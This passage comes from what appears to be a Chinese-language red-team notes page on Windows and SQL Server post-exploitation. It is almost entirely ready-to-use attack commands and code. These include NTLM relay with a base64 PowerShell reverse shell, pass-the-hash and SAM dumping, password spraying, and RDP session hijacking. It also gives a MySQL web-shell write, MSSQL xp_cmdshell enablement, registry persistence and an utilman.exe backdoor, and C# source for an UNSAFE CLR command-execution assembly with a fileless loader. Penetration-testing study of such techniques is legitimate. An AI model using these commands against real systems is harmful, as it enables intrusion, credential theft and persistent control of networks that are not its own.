<h3 class="anchor anchorWithStickyNavbar_LWe7" id="ntlm-relay">NTLM Relay<a href="#ntlm-relay" class="hash-link" aria-label="Direct link to NTLM Relay" title="Direct link to NTLM Relay">​</a></h3>
<ul>
<li><code>impacket-ntlmrelayx --no-http-server -smb2support -t &lt;IP&gt;</code>
<ul>
<li>拿到 SAM</li>
</ul>
</li>
</ul>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="透過-smb-做橫向移動">透過 SMB 做橫向移動<a href="#透過-smb-做橫向移動" class="hash-link" aria-label="Direct link to 透過 SMB 做橫向移動" title="Direct link to 透過 SMB 做橫向移動">​</a></h3>
<p>從密碼噴灑中拿到帳密後，可以對其它台電腦橫向：</p>
<ul>
<li><code>impacket-psexec &lt;username&gt;:&#x27;&lt;password&gt;&#x27;@&lt;IP&gt;</code></li>
<li><code>crackmapexec smb &lt;IP&gt; -u &lt;username&gt; -p &#x27;&lt;password&gt;&#x27; -x &#x27;whoami&#x27; --exec-method smbexec</code></li>
<li>NTLM relay 橫向移動：<code>impacket-ntlmrelayx --no-http-server -smb2support -t &lt;IP&gt; -c &#x27;powershell -e &lt;base_revshell&gt;&#x27;</code></li>
</ul>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="pass-the-hash">Pass the Hash<a href="#pass-the-hash" class="hash-link" aria-label="Direct link to Pass the Hash" title="Direct link to Pass the Hash">​</a></h3>
<ul>
<li>拿到別台的 NTLM hash 後，可以在沒有密碼的情況下橫向移動：<!-- -->
<ul>
<li><code>crackmapexec smb &lt;IP&gt; -u &lt;username&gt; -H &lt;NT(LM) Hash&gt;</code></li>
</ul>
</li>
</ul>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="枚舉同組帳密的其它電腦">枚舉同組帳密的其它電腦<a href="#枚舉同組帳密的其它電腦" class="hash-link" aria-label="Direct link to 枚舉同組帳密的其它電腦" title="Direct link to 枚舉同組帳密的其它電腦">​</a></h4>
<ul>
<li><code>crackmapexec smb &lt;IP&gt; -u &lt;username&gt; -p &#x27;&lt;password&gt;&#x27; --loggedon-users</code></li>
</ul>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="刮其它台電腦的-sam">刮其它台電腦的 SAM<a href="#刮其它台電腦的-sam" class="hash-link" aria-label="Direct link to 刮其它台電腦的 SAM" title="Direct link to 刮其它台電腦的 SAM">​</a></h4>
<ul>
<li><code>crackmapexec smb &lt;IP&gt; -u &lt;username&gt; -p &#x27;&lt;password&gt;&#x27; --sam</code></li>
</ul>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="rpc">RPC<a href="#rpc" class="hash-link" aria-label="Direct link to RPC" title="Direct link to RPC">​</a></h2>
<ul>
<li><code>rpcclient -U&#x27;%&#x27; &lt;IP&gt;</code>
<ul>
<li><code>enumdomusers</code></li>
</ul>
</li>
</ul>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="sql">SQL<a href="#sql" class="hash-link" aria-label="Direct link to SQL" title="Direct link to SQL">​</a></h2>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="mysql">MySQL：<a href="#mysql" class="hash-link" aria-label="Direct link to MySQL：" title="Direct link to MySQL：">​</a></h3>
<ul>
<li>連接：<code>mysql -u &lt;user&gt; -p &lt;password&gt; -h &lt;IP&gt;</code></li>
<li>Command：<!-- -->
<ul>
<li><code>SHOW DATABASES;</code></li>
<li><code>USE Database;</code></li>
<li><code>SHOW TABLES;</code></li>
<li><code>SELECT * FROM &lt;Table&gt;;</code></li>
</ul>
</li>
<li>Read Local Files<!-- -->
<ul>
<li><code>select LOAD_FILE(&quot;/etc/passwd&quot;);</code></li>
</ul>
</li>
<li>Command Execution：<!-- -->
<ul>
<li><code>SELECT &quot;&lt;?php echo shell_exec($_GET[&#x27;c&#x27;]);?&gt;&quot; INTO OUTFILE &#x27;/var/www/html/webshell.php&#x27;;</code></li>
</ul>
</li>
</ul>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="mssql">MSSQL<a href="#mssql" class="hash-link" aria-label="Direct link to MSSQL" title="Direct link to MSSQL">​</a></h3>
<ul>
<li>
<p>連接：</p>
<ul>
<li><code>sqlcmd -S SRVMSSQL -U &lt;user&gt; -P &#x27;&lt;password&gt;&#x27; -y 30 -Y 30</code> or</li>
<li><code>sqsh -S &lt;IP&gt; -U &lt;user&gt; -P &#x27;&lt;password&gt;&#x27; -h</code> or</li>
<li><code>mssqlclient.py -p &lt;port&gt; &lt;user&gt;@&lt;IP&gt;</code></li>
<li><code>impacket-mssqlclient &lt;user&gt;@&lt;IP&gt; -windows-auth</code> (網內互打)</li>
</ul>
</li>
<li>
<p>語法：</p>
<ul>
<li><code>SELECT name FROM master.dbo.sysdatabases</code></li>
<li><code>USE Database</code></li>
<li><code>SELECT table_name FROM htbusers.INFORMATION_SCHEMA.TABLES</code></li>
<li><code>SELECT * FROM &lt;Table&gt;</code></li>
</ul>
</li>
<li>
<p>Read Local Files</p>
<ul>
<li><code>SELECT * FROM OPENROWSET(BULK N&#x27;C:/Windows/System32/drivers/etc/hosts&#x27;, SINGLE_CLOB) AS Contents</code></li>
</ul>
</li>
<li>
<p>Command Execution：</p>
<ul>
<li><code>xp_cmdshell &#x27;&lt;command&gt;&#x27;</code></li>
<li>xp_cmdshell 不能用的話：<!-- -->
<ol>
<li><code>EXECUTE sp_configure &#x27;show advanced options&#x27;, 1</code></li>
<li><code>RECONFIGURE</code></li>
<li><code>EXECUTE sp_configure &#x27;xp_cmdshell&#x27;, 1</code></li>
<li><code>RECONFIGURE</code></li>
</ol>
</li>
<li><a href="https://www.netspi.com/blog/technical-blog/network-pentesting/establishing-registry-persistence-via-sql-server-powerupsql/" target="_blank" rel="noopener noreferrer">Extended stored procedure (xp_regwrite)</a>
<ul>
<li><code>EXECUTE master.sys.xp_regwrite &#x27;HKEY_LOCAL_MACHINE&#x27;, &#x27;Software\Microsoft\Windows\CurrentVersion\Run&#x27;, &#x27;EvilSauce&#x27;, &#x27;REG_SZ&#x27;, &#x27;\\EvilBox\EvilSandwich.exe&#x27;</code></li>
</ul>
</li>
<li>Modify Image File Execution Options (xp_regwrite)<!-- -->
<ul>
<li><code>EXECUTE master.sys.xp_regwrite &#x27;HKEY_LOCAL_MACHINE&#x27;, &#x27;Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe&#x27;, &#x27;Debugger&#x27;, &#x27;REG_SZ&#x27;, &#x27;&quot;c:\windows\system32\cmd.exe&quot;&#x27;</code></li>
</ul>
</li>
<li>CLR (Common Language Runtime)<!-- -->
<ol>
<li><code>sp_configure &#x27;clr enabled&#x27;, 1;</code> 啟用CLR功能</li>
<li><code>RECONFIGURE;</code></li>
<li><code>ALTER DATABASE [資料庫名稱] SET TRUSTWORTHY ON;</code> 允許執行不安全（UNSAFE）的 CLR 組件</li>
<li>製作自訂 CLR DLL</li>
</ol>
<div class="language-sql= codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-sql= codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">using System;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">using System.Data;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">using System.Data.SqlTypes;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">using Microsoft.SqlServer.Server;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">using System.Diagnostics;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">public partial class StoredProcedures</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">{</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    [Microsoft.SqlServer.Server.SqlProcedure]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    public static void cmd_exec(SqlString execCommand)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        Process proc = new Process();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        proc.StartInfo.FileName = @&quot;C:\Windows\System32\cmd.exe&quot;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        proc.StartInfo.Arguments = string.Format(@&quot; /C {0}&quot;, execCommand.Value);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        proc.StartInfo.UseShellExecute = false;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        proc.StartInfo.RedirectStandardOutput = true;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        proc.Start();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        SqlDataRecord record = new SqlDataRecord(new SqlMetaData(&quot;output&quot;, SqlDbType.NVarChar, 4000));</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        SqlContext.Pipe.SendResultsStart(record);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        record.SetString(0, proc.StandardOutput.ReadToEnd().ToString());</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        SqlContext.Pipe.SendResultsRow(record);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        SqlContext.Pipe.SendResultsEnd();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        proc.WaitForExit();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        proc.Close();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<ol start="5">
<li>編譯 dll：
<code>C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /target:library c:\temp\cmd_exec.cs</code></li>
<li>將 CLR DLL 匯入 SQL Server
登入 SQL Server (需具備 sysadmin 或 CREATE ASSEMBLY/ALTER ASSEMBLY 權限)，並執行以下 TSQL：<!-- -->
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">USE msdb;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">-- 啟用 CLR 功能</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sp_configure &#x27;show advanced options&#x27;,1;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">RECONFIGURE;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sp_configure &#x27;clr enabled&#x27;,1;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">RECONFIGURE;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">-- 匯入 CLR 組件</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">CREATE ASSEMBLY my_assembly FROM &#x27;c:\temp\cmd_exec.dll&#x27; WITH PERMISSION_SET = UNSAFE;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">-- 建立儲存程序連結至 CLR 方法</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">CREATE PROCEDURE [dbo].[cmd_exec]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">@execCommand NVARCHAR (4000)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">AS EXTERNAL NAME [my_assembly].[StoredProcedures].[cmd_exec];</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">GO</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
</li>
<li><code>EXEC dbo.cmd_exec &#x27;whoami&#x27;;</code></li>
</ol>
</li>
<li>無檔案方式匯入 CLR DLL</li>
</ul>
<div class="language-powershell= codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-powershell= codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">$assemblyFile = &quot;c:\temp\cmd_exec.dll&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$stringBuilder = New-Object -Type System.Text.StringBuilder</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$stringBuilder.Append(&quot;CREATE ASSEMBLY [my_assembly] AUTHORIZATION [dbo] FROM `n0x&quot;) | Out-Null</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$fileStream = [IO.File]::OpenRead($assemblyFile)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">while (($byte = $fileStream.ReadByte()) -gt -1) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    $stringBuilder.Append($byte.ToString(&quot;X2&quot;)) | Out-Null</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$stringBuilder.AppendLine(&quot;`nWITH PERMISSION_SET = UNSAFE&quot;) | Out-Null</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$stringBuilder.AppendLine(&quot;GO&quot;) | Out-Null</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$stringBuilder.AppendLine(&quot;CREATE PROCEDURE [dbo].[cmd_exec] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [my_assembly].[StoredProcedures].[cmd_exec];&quot;) | Out-Null</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$stringBuilder.AppendLine(&quot;GO&quot;) | Out-Null</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$stringBuilder.AppendLine(&quot;EXEC[dbo].[cmd_exec] &#x27;whoami&#x27;&quot;) | Out-Null</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$stringBuilder.AppendLine(&quot;GO&quot;) | Out-Null</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
</li>
<li>
<p>sqlcmd 用法：</p>
</li>
</ul>
<div class="language-sql= codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-sql= codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">1&gt; &lt;語法&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">2&gt; GO</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="rdp">RDP<a href="#rdp" class="hash-link" aria-label="Direct link to RDP" title="Direct link to RDP">​</a></h2>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="login">Login<a href="#login" class="hash-link" aria-label="Direct link to Login" title="Direct link to Login">​</a></h3>
<ul>
<li><code>rdesktop -u admin -p &lt;password&gt; &lt;IP&gt;</code></li>
</ul>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="password-spraying">Password Spraying<a href="#password-spraying" class="hash-link" aria-label="Direct link to Password Spraying" title="Direct link to Password Spraying">​</a></h3>
<ul>
<li><code>crowbar -b rdp -s &lt;subnet&gt; -U &lt;user list&gt; -c &#x27;&lt;password&gt;&#x27;</code></li>
<li><code>hydra -L &lt;user list&gt; -p &#x27;&lt;password&gt;&#x27; &lt;IP&gt; rdp</code> 兩種都可</li>
</ul>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="session-hijacking">Session Hijacking<a href="#session-hijacking" class="hash-link" aria-label="Direct link to Session Hijacking" title="Direct link to Session Hijacking">​</a></h3>
<ul>
<li><code>tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}</code></li>
</ul>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="pass-the-hash-1">Pass The Hash<a href="#pass-the-hash-1" class="hash-link" aria-label="Direct link to Pass The Hash" title="Direct link to Pass The Hash">​</a></h3>
<ul>
<li>使用前要在確認目標上設定：<!-- -->
<ul>
<li><code>reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f</code></li>
</ul>
</li>
<li><code>xfreerdp /v:&lt;IP&gt; /u:&lt;user&gt; /pth:&lt;NTLM&gt;</code></li>
</ul></div></article><nav class="pagination-nav docusaurus-mt-lg" aria-label="Docs pages"><a class="pagination-nav__link pagination-nav__link--prev" href="/docs/Cyber-Security/Red_Team/Powershell"><div class="pagination-nav__sublabel">Previous</div><div class="pagination-nav__label">紅隊安全 | 不開啟 Powershell 執行 powershell.exe</div></a><a class="pagination-nav__link pagination-nav__link--next" href="/docs/Cyber-Security/Red_Team/lolbas"><div class="pagination-nav__sublabel">Next</div><div class="pagination-nav__label">紅隊安全 | LOLBAS 下載工具</div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#本地-download-遠端-reverse-shell" class="table-of-contents__link toc-highlight">本地 Download 遠端 Reverse shell</a></li><li><a href="#手動枚舉密碼" class="table-of-contents__link toc-highlight">手動枚舉密碼</a></li><li><a href="#自動化工具利用" class="table-of-contents__link toc-highlight">自動化工具利用</a></li><li><a href="#bypass-uac-user-account-control" class="table-of-contents__link toc-highlight">Bypass UAC (User account control)</a></li><li><a href="#劫持-token" class="table-of-contents__link toc-highlight">劫持 Token</a></li><li><a href="#insecure-service-permissions" class="table-of-contents__link toc-highlight">Insecure Service Permissions</a></li><li><a href="#service-unquoted-path" class="table-of-contents__link toc-highlight">Service Unquoted Path</a><ul><li><a href="#利用方式" class="table-of-contents__link toc-highlight">利用方式</a></li></ul></li><li><a href="#安裝提權原則" class="table-of-contents__link toc-highlight">安裝提權原則</a><ul><li><a href="#權限低到高下到上" class="table-of-contents__link toc-highlight">權限低到高(下到上)</a></li><li><a href="#從-administrators-提權到-system" class="table-of-contents__link toc-highlight">從 Administrators 提權到 System</a></li></ul></li><li><a href="#密碼收集" class="table-of-contents__link toc-highlight">密碼收集</a><ul><li><a href="#sam" class="table-of-contents__link toc-highlight">SAM</a></li><li><a href="#dehash" class="table-of-contents__link toc-highlight">deHash</a></li><li><a href="#lsass" class="table-of-contents__link toc-highlight">lsass</a></li></ul></li><li><a href="#dump-memory" class="table-of-contents__link toc-highlight">Dump memory</a></li><li><a href="#nfs" class="table-of-contents__link toc-highlight">NFS</a></li><li><a href="#ftp" class="table-of-contents__link toc-highlight">ftp</a></li><li><a href="#smb" class="table-of-contents__link toc-highlight">SMB</a><ul><li><a href="#password-sparying" class="table-of-contents__link toc-highlight">Password Sparying</a></li><li><a href="#forced-authentication-attacks" class="table-of-contents__link toc-highlight">Forced Authentication Attacks</a></li><li><a href="#ntlm-relay" class="table-of-contents__link toc-highlight">NTLM Relay</a></li><li><a href="#透過-smb-做橫向移動" class="table-of-contents__link toc-highlight">透過 SMB 做橫向移動</a></li><li><a href="#pass-the-hash" class="table-of-contents__link toc-highlight">Pass the Hash</a></li></ul></li><li><a href="#rpc" class="table-of-contents__link toc-highlight">RPC</a></li><li><a href="#sql" class="table-of-contents__link toc-highlight">SQL</a><ul><li><a href="#mysql" class="table-of-contents__link toc-highlight">MySQL：</a></li><li><a href="#mssql" class="table-of-contents__link toc-highlight">MSSQL</a></li></ul></li><li><a href="#rdp" class="table-of-contents__link toc-highlight">RDP</a><ul><li><a href="#login" class="table-of-contents__link toc-highlight">Login</a></li><li><a href="#password-spraying" class="table-of-contents__link toc-highlight">Password Spraying</a></li><li><a href="#session-hijacking" class="table-of-contents__link toc-highlight">Session Hijacking</a></li><li><a href="#pass-the-hash-1" class="table-of-contents__link toc-highlight">Pass The Hash</a></li></ul></li></ul></div></div></div></div></main></div></div></div><footer class="footer footer--dark"><div class="container container-fluid"><div class="row footer__links"><div class="col footer__col"><div class="footer__title">Docs</div><ul class="footer__items clean-list"><li class="footer__item"><a class="footer__link-item" href="/docs/intro">Notes</a></li></ul></div><div class="col footer__col"><div class="footer__title">Community</div><ul class="footer__items clean-list"></ul></div><div class="col footer__col"><div class="footer__title">More</div><ul class="footer__items clean-list"><li class="footer__item"><a href="https://github.com/jonafk555" target="_blank" rel="noopener noreferrer" class="footer__link-item">GitHub<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li></ul></div></div><div class="footer__bottom text--center"><div class="footer__copyright">Copyright © 2025 My Project, Inc. Built with Docusaurus.</div></div></div></footer></div>
</body>
</html>